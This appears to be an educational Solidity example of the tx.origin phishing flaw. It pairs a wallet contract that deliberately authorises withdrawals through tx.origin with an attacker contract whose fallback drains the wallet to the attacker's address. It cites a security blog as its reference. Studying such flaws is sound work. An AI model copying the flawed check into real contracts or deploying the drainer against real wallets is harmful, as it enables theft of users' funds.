pragma solidity ^0.8.0;
contract Phishable{
    address public owner;
    constructor(){
        owner = msg.sender;

    }
    fallback() external payable{

    }
    receive() external payable{

    }

    function withdrawAll(address payable to) public {

        require(tx.origin == owner);
        to.call{value : address(this).balance}("");
    }



}


pragma solidity ^0.8.0;
import "Phishable.sol";
contract PhishingAttacker{
    address payable attacker;
    Phishable smartContract;
    constructor(Phishable _smartContract , address attackerAddress){
        attacker = attackerAddress; // the address that you would like to send the funds to 
        smartContract = _smartContract;  // saving the smart contract address 
    }
    fallback() payable external {
        smartContract.withdrawAll(attacker); // initilizing the attack 
    }
}

// for refrence : https://blog.sigmaprime.io/solidity-security.html#tx-origin
// with thet said tx.origin has some good functionality 
// it can be used to prevent any other smart contract from calling the given function 